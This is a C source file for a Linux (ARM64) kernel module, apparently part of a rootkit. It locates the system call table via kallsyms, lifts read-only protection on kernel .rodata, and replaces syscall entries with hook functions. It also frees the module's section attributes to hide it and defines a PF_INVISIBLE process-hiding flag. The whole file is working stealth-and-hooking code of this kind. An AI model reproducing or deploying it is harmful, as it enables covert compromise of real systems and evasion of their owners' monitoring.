#include "asm-generic/errno-base.h"
#include "asm/memory.h"
#include "asm/pgtable-prot.h"
#include "linux/slab.h"
#include "systemtabhook.h"
#include "kprobehook.h"


#define PF_INVISIBLE 0x10000000

static unsigned long *__sys_call_table;


// typedef void (*update_mapping_prot_t)(phys_addr_t phys, unsigned long virt,
// 				phys_addr_t size, pgprot_t prot);
// update_mapping_prot_t update_mapping_prot_function;
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata

unsigned long* get_syscall_table_bf(void){
    unsigned long *syscall_table;
    syscall_table = (unsigned long*)lookup_name("sys_call_table");
    return syscall_table;
}


static inline void protect_memory(void){
    //把 .rodata 这片内核内存（虚拟地址 + 物理地址映射）修改成只读。
    update_mapping_prot(__pa_symbol(start_rodata),(unsigned long)start_rodata,section_size,PAGE_KERNEL_RO);
}

static inline void unprotect_memory(void){
    update_mapping_prot(__pa_symbol(start_rodata),(unsigned long)start_rodata,section_size,PAGE_KERNEL);
}

static inline void
tidy(void)
{   //从内存结构上看，这个模块再也没有 section 属性信息了
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}


int hook_systemcall_installs(struct systemcall_hook *systemcall_list,size_t count){
    struct systemcall_hook khs;
    t_syscall orig_address;
    for(int i=0;i<count;i++){
        khs = systemcall_list[i];
        if(khs.valid){
        orig_address = (t_syscall)__sys_call_table[khs.id];
        if(!orig_address){
            return -1;
        }
        *khs.orig = orig_address;
        unprotect_memory();
        __sys_call_table[khs.id]=(unsigned long)khs.func;
        protect_memory();  
        }
    }
    return 0;
}

int hook_systemcall_removes(struct systemcall_hook *systemcall_list,size_t count){
    struct systemcall_hook khs;
    for(int i=0;i<count;i++){
        khs = systemcall_list[i];
        if(khs.valid){
            unprotect_memory();
            __sys_call_table[khs.id] = (unsigned long)*khs.orig;
            protect_memory(); 
        }
    }
    return 0; 
}

int systemcall_hook_init(struct systemcall_hook *systemcall_list,size_t count){
    pr_info("systemcall hook init\n");
    if(!kallsyms_lookup_name_function){
        pr_err("kallsyms_lookup_name address error\n");
        return -ENXIO;
    }
    pr_info("kallsyms_lookup_name address:%px\n",(void*)kallsyms_lookup_name_function);
    __sys_call_table = get_syscall_table_bf();
    if(!__sys_call_table){
        return -1;
    }
    update_mapping_prot = (void *)lookup_name("update_mapping_prot");
    start_rodata = (unsigned long)lookup_name("__start_rodata");
    init_begin = (unsigned long)lookup_name("__init_begin");
    tidy();
    return hook_systemcall_installs(systemcall_list, count);
};



void systemcall_hook_exit(struct systemcall_hook *systemcall_list,size_t count){
    hook_systemcall_removes(systemcall_list,count);
    pr_info("systemcall hook exit\n");
}